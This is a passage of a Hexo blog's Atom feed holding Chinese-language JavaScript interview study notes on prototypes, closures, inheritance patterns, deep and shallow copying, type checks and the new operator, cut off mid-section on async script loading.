      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这篇文章会记录我的一些Vue知识点笔记，方便自己进行复习，长期施工…&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Vue" scheme="https://gzzzzh.github.io/tags/Vue/"/>
    
      <category term="面试题" scheme="https://gzzzzh.github.io/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>js知识点(施工中)</title>
    <link href="https://gzzzzh.github.io/2019/06/22/js%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <id>https://gzzzzh.github.io/2019/06/22/js知识点/</id>
    <published>2019-06-22T15:56:42.000Z</published>
    <updated>2019-09-06T07:01:46.388Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章会记录我的一些js知识点笔记，方便自己进行复习，长期施工…<br><a id="more"></a></p><h2 id="原型和原型链"><a href="#原型和原型链" class="headerlink" title="原型和原型链"></a>原型和原型链</h2><p><img src="http://seo-1255598498.file.myqcloud.com/full/5c33584700ba452eabd9dbede94cc076855855ec.jpg" alt></p><ol><li>只有构造函数才有prototype</li><li>构造函数的prototype或者实例的<strong>proto</strong>是一个空对象，这个空对象是一个对象实例，<strong>proto</strong>指向Object.prototype</li><li>Object.prototype的<strong>proto</strong>指向null，是原型链的尽头了</li><li>构造函数Function()的prototype和<strong>proto</strong>都指向了Function.prototype</li></ol><h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>闭包是一个函数里面生成并返回一个函数，返回的这个函数能读取到外部函数的变量，本质上闭包是内部函数和外部函数连接的桥梁</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">n,o</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(o)</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    fun:<span class="function"><span class="keyword">function</span>(<span class="params">m</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> fun(m,n);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = fun(<span class="number">0</span>);  a.fun(<span class="number">1</span>);  a.fun(<span class="number">2</span>);  a.fun(<span class="number">3</span>);<span class="comment">//undefined,?,?,?</span></span><br><span class="line"><span class="keyword">var</span> b = fun(<span class="number">0</span>).fun(<span class="number">1</span>).fun(<span class="number">2</span>).fun(<span class="number">3</span>);<span class="comment">//undefined,?,?,?</span></span><br><span class="line"><span class="keyword">var</span> c = fun(<span class="number">0</span>).fun(<span class="number">1</span>);  c.fun(<span class="number">2</span>);  c.fun(<span class="number">3</span>);<span class="comment">//undefined,?,?,?</span></span><br><span class="line"><span class="comment">//问:三行a,b,c的输出分别是什么？</span></span><br></pre></td></tr></table></figure><p>可以得出 </p><p>0,0,0 </p><p>0,1,2 </p><p>0,1,1</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>可以得知，第一个fun(0)是在调用第一层fun函数。第二个fun(1)是在调用前一个fun的返回值的fun函数，所以：</p><p>第后面几个fun(1),fun(2),fun(3),函数都是在调用第二层fun函数。</p><p>在第一次调用fun(0)时，o为undefined；</p><p>第二次调用fun(1)时m为1，此时fun闭包了外层函数的n，也就是第一次调用的n=0，即m=1，n=0，并在内部调用第一层fun函数fun(1,0);所以o为0；</p><p>第三次调用fun(2)时m为2，但依然是调用a.fun，所以还是闭包了第一次调用时的n，所以内部调用第一层的fun(2,0);所以o为0</p><p>第四次同理；</p><p>即：最终答案为undefined,0,0,0</p><p><hr><br>先从fun(0)开始看，肯定是调用的第一层fun函数；而他的返回值是一个对象，所以第二个fun(1)调用的是第二层fun函数，后面几个也是调用的第二层fun函数。</p><p>遂：</p><p>在第一次调用第一层fun(0)时，o为undefined；</p><p>第二次调用 .fun(1)时m为1，此时fun闭包了外层函数的n，也就是第一次调用的n=0，即m=1，n=0，并在内部调用第一层fun函数fun(1,0);所以o为0；</p><p>第三次调用 .fun(2)时m为2，此时当前的fun函数不是第一次执行的返回对象，而是第二次执行的返回对象。而在第二次执行第一层fun函数时时(1,0)所以n=1,o=0,返回时闭包了第二次的n，遂在第三次调用第三层fun函数时m=2,n=1，即调用第一层fun函数fun(2,1)，所以o为1；</p><p>第四次调用 .fun(3)时m为3，闭包了第三次调用的n，同理，最终调用第一层fun函数为fun(3,2)；所以o为2；</p><p>即最终答案：undefined,0,1,2</p><hr><p>根据前面两个例子，可以得知：</p><p>fun(0)为执行第一层fun函数，.fun(1)执行的是fun(0)返回的第二层fun函数，这里语句结束，遂c存放的是fun(1)的返回值，而不是fun(0)的返回值，所以c中闭包的也是fun(1)第二次执行的n的值。c.fun(2)执行的是fun(1)返回的第二层fun函数，c.fun(3)执行的也是fun(1)返回的第二层fun函数。</p><p>遂：</p><p>在第一次调用第一层fun(0)时，o为undefined；</p><p>第二次调用 .fun(1)时m为1，此时fun闭包了外层函数的n，也就是第一次调用的n=0，即m=1，n=0，并在内部调用第一层fun函数fun(1,0);所以o为0；</p><p>第三次调用 .fun(2)时m为2，此时fun闭包的是第二次调用的n=1，即m=2，n=1，并在内部调用第一层fun函数fun(2,1);所以o为1；</p><p>第四次.fun(3)时同理，但依然是调用的第二次的返回值，遂最终调用第一层fun函数fun(3,1)，所以o还为1</p><p>即最终答案：undefined,0,1,1</p><hr><p>闭包有两个用处，一个是可以读取函数内部的变量，另一个就是让这些变量的值始终保持在内存中，不会在函数调用后被自动清除。</p><p>闭包缺点，闭包会使函数的变量存放在内存中，会增加内存的消耗，发生内存泄露，时间长了会导致内存溢出。增加了代码的复杂度，不便于维护。</p><p>在实际中闭包应该不能滥用，能不用到闭包的就不用</p><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>继承分为7种，效果比较好的常用的有3种，分别是组合继承，寄生组合继承，class继承</p><h3 id="组合继承-最常用"><a href="#组合继承-最常用" class="headerlink" title="组合继承(最常用)"></a>组合继承(最常用)</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span> (<span class="params">name,age</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name</span><br><span class="line">  <span class="keyword">this</span>.age = age</span><br><span class="line">  <span class="keyword">this</span>.color = [<span class="string">'red'</span>,<span class="string">'green'</span>,<span class="string">'blue'</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Parent.prototype.getName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span> (<span class="params">name,age</span>) </span>&#123;</span><br><span class="line">  Parent.call(<span class="keyword">this</span>,name,age)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Child.prototype = <span class="keyword">new</span> Parent()</span><br><span class="line">Child.prototype.constructor = Child</span><br><span class="line">Child.prototype.getAge = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.age);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> child = <span class="keyword">new</span> Child(<span class="string">'带娃'</span>,<span class="number">22</span>)</span><br><span class="line">child.getName()</span><br><span class="line">child.getAge()</span><br><span class="line">child.color.push(<span class="string">'black'</span>)</span><br><span class="line"><span class="built_in">console</span>.log(child.color);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> child1 = <span class="keyword">new</span> Child(<span class="string">'五娃'</span>,<span class="number">30</span>)</span><br><span class="line">child1.getName()</span><br><span class="line">child1.getAge()</span><br><span class="line"><span class="built_in">console</span>.log(child1.color);</span><br></pre></td></tr></table></figure><h4 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h4><ol><li>不存在父类引用属性共享问题</li><li>可以给父类构造参数传参</li><li>通过原型属性设置方法，使得函数可以复用</li><li>最常用的继承方式</li></ol><h4 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h4><p>子类调用了两次父类构造函数，生成了两个父类实例，第二次调用时改变了指向第一个实例的指针，使得第一个实例多余了</p><h3 id="寄生组合继承-最佳"><a href="#寄生组合继承-最佳" class="headerlink" title="寄生组合继承(最佳)"></a>寄生组合继承(最佳)</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span> (<span class="params">name,age</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name</span><br><span class="line">  <span class="keyword">this</span>.age = age</span><br><span class="line">  <span class="keyword">this</span>.color = [<span class="string">'red'</span>,<span class="string">'green'</span>,<span class="string">'blue'</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Parent.prototype.getName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span> (<span class="params">name,age</span>) </span>&#123;</span><br><span class="line">  Parent.call(<span class="keyword">this</span>,name,age)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initPrototype</span>(<span class="params">Child,Parent</span>) </span>&#123; <span class="comment">//获得父类原型上的方法，也就是把原型链连接起来</span></span><br><span class="line">  <span class="keyword">let</span> prototype = <span class="built_in">Object</span>.create(Parent.prototype) <span class="comment">//创建一个父类原型的副本，相当于prototype.__proto__ = Parent.prototype</span></span><br><span class="line">  Child.prototype = prototype</span><br><span class="line">   Child.prototype.constructor = Child </span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">initPrototype(Child,Parent)</span><br><span class="line">Child.prototype.getAge = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="comment">//顺序不能调转，不然原型会被重写</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.age);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> child = <span class="keyword">new</span> Child(<span class="string">'带娃'</span>,<span class="number">22</span>)</span><br><span class="line">child.getName()</span><br><span class="line">child.getAge()</span><br><span class="line">child.color.push(<span class="string">'black'</span>)</span><br><span class="line"><span class="built_in">console</span>.log(child.color);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> child1 = <span class="keyword">new</span> Child(<span class="string">'五娃'</span>,<span class="number">30</span>)</span><br><span class="line">child1.getName()</span><br><span class="line">child1.getAge()</span><br><span class="line"><span class="built_in">console</span>.log(child1.color);</span><br></pre></td></tr></table></figure><h4 id="优点：-1"><a href="#优点：-1" class="headerlink" title="优点："></a>优点：</h4><ol><li>和上面一样</li><li>只调用了一次父类构造函数，避免了多余的数据</li></ol><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>用起来麻烦</p><h3 id="class继承"><a href="#class继承" class="headerlink" title="class继承"></a>class继承</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(name,age)&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name</span><br><span class="line">    <span class="keyword">this</span>.age = age</span><br><span class="line">  &#125;</span><br><span class="line">  getName()&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span> <span class="keyword">extends</span> <span class="title">Parent</span></span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(name,age,sex)&#123;</span><br><span class="line">    <span class="keyword">super</span>(name,age)</span><br><span class="line">    <span class="keyword">this</span>.sex = sex</span><br><span class="line">  &#125;</span><br><span class="line">  getAge()&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.age,<span class="keyword">this</span>.sex);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> child = <span class="keyword">new</span> Child(<span class="string">'带娃'</span>, <span class="number">22</span> ,<span class="string">'male'</span>)</span><br><span class="line">child.getName()</span><br><span class="line">child.getAge()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> child1 = <span class="keyword">new</span> Child(<span class="string">'五娃'</span>,<span class="number">30</span> , <span class="string">'male'</span>)</span><br><span class="line">child1.getName()</span><br><span class="line">child1.getAge()</span><br></pre></td></tr></table></figure><h4 id="优点：-2"><a href="#优点：-2" class="headerlink" title="优点："></a>优点：</h4><ol><li>使用简单方便</li><li>上面的优点都有</li></ol><h4 id="缺点：-1"><a href="#缺点：-1" class="headerlink" title="缺点："></a>缺点：</h4><p>ES6语法，有一定的兼容性问题，经测试IE浏览器不支持</p><h2 id="浅拷贝和深拷贝"><a href="#浅拷贝和深拷贝" class="headerlink" title="浅拷贝和深拷贝"></a>浅拷贝和深拷贝</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>在javascript中，我们将数据分成基本数据类型(原始值)与引用类型</p><ol><li>基本数据类型的值是按值访问的，基本类型的值是不可变的</li><li>引用类型的值是按引用访问的，引用类型的是动态可变的，意思是我们访问的是值的地址，这个地址指向这些值</li><li>基本数据类型的比较是值的</li><li>引用类型的比较是引用地址的比较</li></ol><p>根据这些特点，我们所涉及的拷贝对象，也都是针对引用类型的，这就引出了浅拷贝和深拷贝</p><h3 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h3><p>浅拷贝是指只复制一层对象，当对象的属性是引用类型时，实质复制的是其引用，当引用指向的值改变时也会跟着变化。</p><p>举个例子<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,[<span class="number">2</span>,<span class="number">3</span>],<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr2 = arr.slice()</span><br><span class="line"></span><br><span class="line">arr2[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(arr); <span class="comment">//[ 1, [ 6, 3 ], 4, 5 ]</span></span><br><span class="line"><span class="built_in">console</span>.log(arr2); <span class="comment">//[ 1, [ 6, 3 ], 4, 5 ]</span></span><br></pre></td></tr></table></figure></p><table><thead><tr><th>–</th><th>和原数据是否指向同一对象</th><th>第一层数据为基本数据类型</th><th>原数据中包含子对象</th></tr></thead><tbody><tr><td>赋值</td><td>是</td><td>改变会使原数据一同改变</td><td>改变会使原数据一同改变</td></tr><tr><td>浅拷贝</td><td>否</td><td>改变不会使原数据一同改变</td><td>改变会使原数据一同改变</td></tr></tbody></table><p>其他浅拷贝的方法：</p><ol><li>Array.prototype.slice()</li><li>Array.prototype.concat()</li><li>Object.assign</li><li>拓展操作符…</li></ol><h3 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h3><p>浅拷贝由于只是复制一层对象的属性，当遇到有子对象的情况时，子对象就会互相影响。所以，深拷贝是对对象以及对象的所有子对象进行拷贝</p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>我们实现的思路就是当遇到子对象的时候，再次进行浅拷贝，如此递归。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deepCopy</span> (<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!obj || <span class="keyword">typeof</span> obj !== <span class="string">'object'</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'error'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> targetObj = obj.constructor === <span class="built_in">Array</span> ? [] : &#123;&#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj.hasOwnProperty(key)) &#123;</span><br><span class="line">      <span class="keyword">if</span>(obj[key] &amp;&amp; <span class="keyword">typeof</span> obj[key] === <span class="string">'object'</span>) &#123;</span><br><span class="line">        targetObj[key] = deepCopy(obj[key])</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        targetObj[key] = obj[key];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> targetObj</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj1 = &#123;</span><br><span class="line">  arr: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">  key: &#123;</span><br><span class="line">      id: <span class="number">22</span></span><br><span class="line">  &#125;,</span><br><span class="line">  func: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="number">123</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj2 = deepCopy(obj1);</span><br><span class="line"></span><br><span class="line">obj1.arr.push(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(obj1.arr); <span class="comment">// [1, 2, 3, 4]</span></span><br><span class="line"><span class="built_in">console</span>.log(obj2.arr); <span class="comment">// [1, 2, 3]</span></span><br><span class="line"><span class="built_in">console</span>.log(obj1.key === obj2.key); <span class="comment">// false</span></span><br><span class="line"><span class="built_in">console</span>.log(obj1.func === obj2.func); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><p>对于深拷贝的对象，改变源对象不会对得到的对象有影响。只是在拷贝的过程中源对象的方法丢失了，这是因为在序列化 JavaScript 对象时，所有函数和原型成员会被有意忽略</p><p>还有一种实现深拷贝的方式是利用 JSON 对象中的 parse 和 stringify，JOSN 对象中的 stringify 可以把一个 js 对象序列化为一个 JSON 字符串，parse 可以把 JSON 字符串反序列化为一个 js 对象，通过这两个方法，也可以实现对象的深拷贝。</p><p>不过这种方法有很多缺点</p><ol><li>时间对象转换过来是字符串</li><li>正则，Error对象转换过来会变成空对象</li><li>undefined，函数回丢失</li><li>NaN，Infinity和-Infinity会变成null</li><li>只能序列化自身的枚举属性</li></ol><h2 id="判断JS数据类型"><a href="#判断JS数据类型" class="headerlink" title="判断JS数据类型"></a>判断JS数据类型</h2><h3 id="typeof"><a href="#typeof" class="headerlink" title="typeof"></a>typeof</h3><p>typeof操作符：返回一个字符串，对于简单数据类型来说，返回其基本数据类型，函数对象返回function，其他对象(包括null)均返回object</p><h4 id="为什么null返回的是object"><a href="#为什么null返回的是object" class="headerlink" title="为什么null返回的是object"></a>为什么null返回的是object</h4><p>在JS最初版本使用的32位系统，为了性能使用低位存储变量类型信息，000开头的是对象，而null是全为0</p><p>null也返回object的原因：在第一版js中，只有5种数据类型，都设计成32位，其中最低的3位用来表述数据类型，对象为000，而null设计成作为object的一种特殊情况，32位全是0</p><h3 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h3><p>instanceof：用来判断A是否是B的实例，表达式为A instanceof B，返回一个布尔值，他只能判断两个对象是否有实例关系，不能判断一个对象的具体实例，根据原型链往上寻找</p><h3 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h3><p>constructor: 当一个函数被定义时，JS引擎会为其添加prototype原型，然后再在 prototype上添加一个 constructor 属性，并让其指向该函数的引用，但这种方法很不稳定，因为prototype可以重新，重写之后默认为Object，因此我们在重写原型的时候一般也要重新设置constructor</p><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString"></a>toString</h3><p>toString: Object 的原型方法，调用该方法，默认返回当前对象的 [[Class]] 。这是一个内部属性，其格式为 [object Xxx] ，其中 Xxx 就是对象的类型</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="string">''</span>) <span class="comment">//[object String]</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="number">11</span>) ;    <span class="comment">// [object Number]</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="literal">true</span>) ; <span class="comment">// [object Boolean]</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="built_in">Symbol</span>()); <span class="comment">//[object Symbol]</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="literal">undefined</span>) ; <span class="comment">// [object Undefined]</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="literal">null</span>) ; <span class="comment">// [object Null]</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="keyword">new</span> <span class="built_in">Function</span>()) ; <span class="comment">// [object Function]</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call([]) ; <span class="comment">// [object Array]</span></span><br></pre></td></tr></table></figure><h2 id="undefined和null的区别"><a href="#undefined和null的区别" class="headerlink" title="undefined和null的区别"></a>undefined和null的区别</h2><h3 id="null"><a href="#null" class="headerlink" title="null"></a>null</h3><p>null表示没有对象，即该处不应该有值</p><ol><li>作为函数的参数，表示该函数的参数不是对象</li><li>作为对象原型链的终点</li><li><p>判断的时候不能用==，要用===</p><h3 id="undefined"><a href="#undefined" class="headerlink" title="undefined"></a>undefined</h3><p>undefined表示缺少值，就是此处应该有一个值，但是还没有定义</p></li><li><p>变量被声明，但没有赋值就等于undefined</p></li><li>调用函数时，应该提供的参数没有提供，该参数为undefined</li><li>对象没有赋值的属性，该属性值为undefined</li><li>函数没有返回值时，默认返回undefined</li></ol><h2 id="new操作符具体干了什么"><a href="#new操作符具体干了什么" class="headerlink" title="new操作符具体干了什么"></a>new操作符具体干了什么</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 创建了一个空对象</span><br><span class="line"><span class="keyword">var</span> obj =&#123;&#125;</span><br><span class="line"><span class="number">2.</span> 空对象的__proto__指向函数的prototype</span><br><span class="line">obj.__proto__ = 函数.prototype</span><br><span class="line"><span class="number">3.</span> 将对象作为函数的<span class="keyword">this</span>传进去，如果函数有<span class="keyword">return</span>，并且<span class="keyword">return</span>出来的东西是对象就直接返回这个对象，否则就返回创建的这个对象</span><br><span class="line">函数.apply(obj,参数)</span><br><span class="line"><span class="number">4.</span>将初始化完毕的新对象地址，赋值给等号左边的变量</span><br></pre></td></tr></table></figure><h3 id="自己实现"><a href="#自己实现" class="headerlink" title="自己实现"></a>自己实现</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span> (<span class="params">name,age</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name</span><br><span class="line">    <span class="keyword">this</span>.age = age</span><br><span class="line">    <span class="comment">/* return [1,2,3] */</span></span><br><span class="line">&#125;</span><br><span class="line">Person.prototype.getName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Creat</span>(<span class="params">fun</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> args = [...arguments].slice(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">let</span> obj = <span class="built_in">Object</span>.create(fun.prototype)</span><br><span class="line">    <span class="keyword">const</span> fun_result = fun.apply(obj,args)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">typeof</span> fun_result == <span class="string">'object'</span> || <span class="keyword">typeof</span> fun_result == <span class="string">'function'</span> ? fun_result : obj</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> tom = Creat(Person,<span class="string">'Tom'</span>,<span class="number">12</span>)</span><br><span class="line"><span class="comment">/* let tom = new Person('tom',12) */</span></span><br><span class="line"><span class="built_in">console</span>.log(tom);</span><br><span class="line">tom.getName()</span><br><span class="line"><span class="built_in">console</span>.log(tom <span class="keyword">instanceof</span> Person);</span><br></pre></td></tr></table></figure><h2 id="同步和异步的区别，怎么异步加载javascript"><a href="#同步和异步的区别，怎么异步加载javascript" class="headerlink" title="同步和异步的区别，怎么异步加载javascript"></a>同步和异步的区别，怎么异步加载javascript</h2><h3 id="同步模式"><a href="#同步模式" class="headerlink" title="同步模式"></a>同步模式</h3><p>同步模式，又称阻塞模式。javascript在默认情况下是阻塞加载。当前面的js请求没有处理和执行完成时会阻止浏览器的后续处理。</p><h3 id="异步模式"><a href="#异步模式" class="headerlink" 